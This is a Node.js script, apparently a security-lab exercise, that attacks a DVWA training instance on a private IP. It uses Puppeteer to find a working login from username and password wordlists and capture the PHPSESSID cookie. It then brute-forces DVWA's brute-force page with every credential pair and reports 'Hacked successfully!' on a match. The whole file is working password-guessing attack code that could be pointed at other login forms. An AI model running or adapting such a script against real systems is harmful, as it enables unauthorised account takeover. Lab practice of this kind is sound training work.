const fs = require("node:fs/promises");
const puppeteer = require("puppeteer");
const ipaddress = "10.115.2.12";
let page;
let successful = false;

async function getPHPSESSID(usernames, passwords) {
  const browser = await puppeteer.launch();
  for (const username of usernames) {
    for (const password of passwords) {
      // Browser öffnen
      try {
        page = await browser.newPage();

        // DVWA öffnen
        await page.goto("http://10.115.2.12:4280/");

        // Screen size
        await page.setViewport({ width: 1080, height: 1024 });

        // Login
        console.log(
          "Trying to login with username: " +
            username +
            " and password" +
            password
        );
        await page.type('input[name="username"]', username);
        await page.type('input[name="password"]', password);
        await page.click('input[type="submit"]');
        await page.waitForNavigation();
        const cookies = await page.cookies();

        // Prüfen ob nicht incorrect in der Antwort enthalten ist
        if (!(await page.content()).includes("failed")) {
          console.log(
            "First login successfully with username: " +
              username +
              " and password: " +
              password
          );
          successful = true;
          await browser.close();
          return cookies.find((cookie) => cookie.name === "PHPSESSID").value;
        }
      } finally {
        if (!successful) {
          await page.close();
        }
      }
    }
  }
  console.log("No valid login found");
  await browser.close();
  return null;
}

const main = async () => {
  try {
    // Wordlists laden
    const userData = await fs.readFile("./usernames.txt", "utf8");
    const passData = await fs.readFile("./passwords.txt", "utf8");

    // Usernames und Passwörter in Arrays umwandeln
    const usernames = userData
      .trim()
      .split("\n")
      .map((line) => line.trim());
    const passwords = passData
      .trim()
      .split("\n")
      .map((line) => line.trim());

    // PHPSESSID holen
    const PHPSESSID = await getPHPSESSID(usernames, passwords);

    // Brute-Force
    for (const username of usernames) {
      for (const password of passwords) {
        const response = await fetch(
          `http://${ipaddress}:4280/vulnerabilities/brute/?username=${username}&password=${password}&Login=Login#`,
          {
            method: "GET",
            headers: {
              Cookie: `PHPSESSID=${PHPSESSID}; security=low`,
            },
          }
        );
        const text = await response.text();
        if (text.includes("incorrect")) {
          console.log(
            `Username: ${username}, Password: ${password} is incorrect`
          );
        } else {
          console.log("Hacked successfully!");
          console.log(`Username: ${username}, Password: ${password}`);
          process.exit();
        }
      }
    }
  } catch (error) {
    console.error("Error in main:", error);
  }
};

main();
